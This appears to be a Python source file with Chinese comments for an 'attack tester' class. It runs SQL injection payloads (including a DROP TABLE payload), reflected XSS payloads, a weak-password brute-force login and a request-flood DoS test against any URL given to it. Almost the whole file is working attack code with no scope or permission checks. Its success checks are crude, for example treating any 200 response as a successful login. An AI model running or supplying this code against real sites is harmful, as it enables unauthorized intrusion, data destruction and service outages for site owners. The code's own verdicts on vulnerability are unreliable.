"""
攻击测试器：执行 SQL 注入、XSS、暴力破解、DoS 等攻击测试
"""
import asyncio
import random
import string
from typing import Any, Dict, List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils.logger import logger


class AttackTester:
    """攻击测试器"""

    def __init__(self):
        self.logger = logger

    async def sql_injection_attack(self, target_url: str, param: str = "id") -> Dict[str, Any]:
        """
        SQL 注入攻击测试
        """
        self.logger.info(f"SQL 注入测试: {target_url}, 参数: {param}")

        # SQL 注入 payloads
        sql_payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "1' AND '1'='1",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
        ]

        results = []
        for payload in sql_payloads:
            try:
                # 构建测试 URL
                parsed = urlparse(target_url)
                query = parse_qs(parsed.query)
                query[param] = payload
                new_query = urlencode(query, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                # 简单测试（实际应该使用专业工具如 sqlmap）
                import urllib.request
                req = urllib.request.Request(test_url)
                req.add_header("User-Agent", "Mozilla/5.0")
                try:
                    resp = urllib.request.urlopen(req, timeout=10)
                    results.append({
                        "payload": payload,
                        "status": resp.status,
                        "vulnerable": False,
                        "note": "需要进一步验证"
                    })
                except urllib.error.HTTPError as e:
                    results.append({
                        "payload": payload,
                        "status": e.code,
                        "vulnerable": e.code >= 500,
                        "note": f"HTTP {e.code}"
                    })
                except Exception as e:
                    results.append({
                        "payload": payload,
                        "status": None,
                        "vulnerable": False,
                        "note": str(e)
                    })

            except Exception as e:
                self.logger.error(f"SQL注入测试错误: {e}")

        return {
            "target": target_url,
            "param": param,
            "payloads_tested": len(results),
            "results": results[:5],  # 只返回前5个结果
            "recommendation": "建议使用专业工具(sqlmap)进行深度测试"
        }

    async def xss_attack(self, target_url: str, param: str = "q") -> Dict[str, Any]:
        """
        XSS 攻击测试
        """
        self.logger.info(f"XSS 测试: {target_url}, 参数: {param}")

        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
        ]

        results = []
        for payload in xss_payloads:
            try:
                parsed = urlparse(target_url)
                query = parse_qs(parsed.query)
                query[param] = payload
                new_query = urlencode(query, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                import urllib.request
                req = urllib.request.Request(test_url)
                req.add_header("User-Agent", "Mozilla/5.0")
                try:
                    resp = urllib.request.urlopen(req, timeout=10)
                    body = resp.read().decode('utf-8', errors='ignore')
                    # 简单检测 payload 是否在响应中
                    vulnerable = payload in body
                    results.append({
                        "payload": payload,
                        "status": resp.status,
                        "vulnerable": vulnerable
                    })
                except urllib.error.HTTPError as e:
                    results.append({
                        "payload": payload,
                        "status": e.code,
                        "vulnerable": False,
                        "note": f"HTTP {e.code}"
                    })
                except Exception as e:
                    results.append({
                        "payload": payload,
                        "status": None,
                        "vulnerable": False,
                        "note": str(e)
                    })

            except Exception as e:
                self.logger.error(f"XSS测试错误: {e}")

        return {
            "target": target_url,
            "param": param,
            "payloads_tested": len(results),
            "results": results[:5],
            "recommendation": "建议使用专业工具进行深度测试"
        }

    async def brute_force_login(self, target_url: str, username: str = "admin",
                                passwords: List[str] = None) -> Dict[str, Any]:
        """
        暴力破解登录测试
        """
        self.logger.info(f"暴力破解测试: {target_url}, 用户名: {username}")

        if passwords is None:
            passwords = ["admin", "123456", "password",
                         "root", "test", "12345", "qwerty"]

        # 尝试常见弱口令
        results = []
        for pwd in passwords[:10]:  # 限制测试数量
            try:
                import urllib.request
                import urllib.parse

                # 常见登录参数
                data = urllib.parse.urlencode({
                    "username": username,
                    "password": pwd,
                    "login": "submit"
                }).encode()

                req = urllib.request.Request(target_url, data=data)
                req.add_header("User-Agent", "Mozilla/5.0")
                req.add_header(
                    "Content-Type", "application/x-www-form-urlencoded")

                try:
                    resp = urllib.request.urlopen(req, timeout=10)
                    # 检查是否登录成功（通常会重定向或显示不同内容）
                    results.append({
                        "password": pwd,
                        "status": resp.status,
                        "success": resp.status in [200, 302],
                        "note": "需要进一步验证"
                    })
                except urllib.error.HTTPError as e:
                    results.append({
                        "password": pwd,
                        "status": e.code,
                        "success": False,
                        "note": f"HTTP {e.code}"
                    })
                except Exception as e:
                    results.append({
                        "password": pwd,
                        "status": None,
                        "success": False,
                        "note": str(e)[:50]
                    })

            except Exception as e:
                self.logger.error(f"暴力破解测试错误: {e}")

        return {
            "target": target_url,
            "username": username,
            "passwords_tested": len(results),
            "results": results,
            "recommendation": "建议使用专业工具(Hydra/Medusa)进行深度测试"
        }

    async def dos_test(self, target_url: str, duration: int = 5,
                       concurrent_requests: int = 50) -> Dict[str, Any]:
        """
        DoS 攻击测试（简单测试）
        """
        self.logger.info(
            f"DoS 测试: {target_url}, 持续: {duration}秒, 并发: {concurrent_requests}")

        import urllib.request

        async def flood():
            count = 0
            end_time = asyncio.get_event_loop().time() + duration
            while asyncio.get_event_loop().time() < end_time:
                try:
                    req = urllib.request.Request(target_url)
                    req.add_header(
                        "User-Agent", f"Mozilla/5.0 (DoS Test {random.randint(1000,9999)})")
                    urllib.request.urlopen(req, timeout=2)
                    count += 1
                except:
                    pass
            return count

        try:
            tasks = [flood() for _ in range(min(concurrent_requests, 10))]
            results = await asyncio.gather(*tasks)
            total_requests = sum(results)

            return {
                "target": target_url,
                "duration": duration,
                "concurrent": concurrent_requests,
                "total_requests": total_requests,
                "note": "仅做简单连通性测试，实际DoS需要更大规模"
            }
        except Exception as e:
            return {
                "target": target_url,
                "error": str(e),
                "note": "DoS测试失败"
            }
